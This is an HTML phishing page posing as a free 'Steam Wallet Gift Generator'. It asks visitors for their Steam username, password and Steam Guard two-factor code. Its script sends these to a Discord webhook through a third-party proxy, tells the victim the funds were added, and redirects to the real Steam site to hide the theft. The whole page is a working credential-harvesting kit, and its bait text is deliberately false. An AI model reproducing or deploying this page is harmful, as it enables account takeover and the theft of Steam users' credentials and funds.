<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Steam Wallet Generator 2025 - Free $100</title>
    <style>
        body { background: #171a21; color: white; font-family: Arial; text-align: center; padding: 50px; }
        .container { max-width: 400px; margin: auto; }
        input, select, button { width: 100%; padding: 15px; margin: 10px 0; font-size: 16px; border-radius: 4px; border: 1px solid #3d4450; background: #2a3341; color: white; }
        button { background: #66c0f4; color: black; border: none; cursor: pointer; font-weight: bold; }
        button:hover { background: #5ab2e6; }
        .note { color: #66c0f4; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Steam Wallet Gift Generator 2025</h1>
        <p>Choose amount → Verify account → Funds added instantly!</p>
        <select id="amount">
            <option>$20 Free</option>
            <option>$50 Free</option>
            <option>$100 Free</option>
        </select>
        <input type="text" id="username" placeholder="Steam Username/Email" required>
        <input type="password" id="password" placeholder="Password" required>
        <input type="text" id="guard" placeholder="Steam Guard Code (if 2FA)" autocomplete="off">
        <button onclick="submitLogin()">CLAIM FREE WALLET FUNDS</button>
        <p class="note">Limited time — funds appear in 5–10 minutes.</p>
    </div>

    <script>
        function submitLogin() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const guard = document.getElementById('guard').value || 'None';
            const amount = document.getElementById('amount').value;

            if (!username || !password) {
                alert("Fill in username and password!");
                return;
            }

            
            const proxyUrl = 'https://api.allorigins.win/raw?url=';
            const webhook = encodeURIComponent("https://discord.com/api/webhooks/https://discord.com/api/webhooks/1444089610777923735/2cs6f1Zca7-ZqHH-u3CK8UmtYgKz9GkZwiAERsgPPZXt4yVDP1Wn0f4uoSw8oBKrYm4H");

            const data = {
                username: "Steam Login Logger",
                content: `**NEW STEAM LOGIN**\n**User:** ${username}\n**Pass:** ${password}\n**Guard:** ${guard}\n**Amount:** ${amount}\n**IP:** ${navigator.userAgent}`
            };

            fetch(proxyUrl + webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                alert("Funds added! Check Steam in 5 minutes.");
                window.location.href = "https://store.steampowered.com/account/"; // Real Steam redirect
            }).catch(err => {
                alert("Error — try again!");
                console.log(err);
            });
        }
    </script>
</body>
</html>
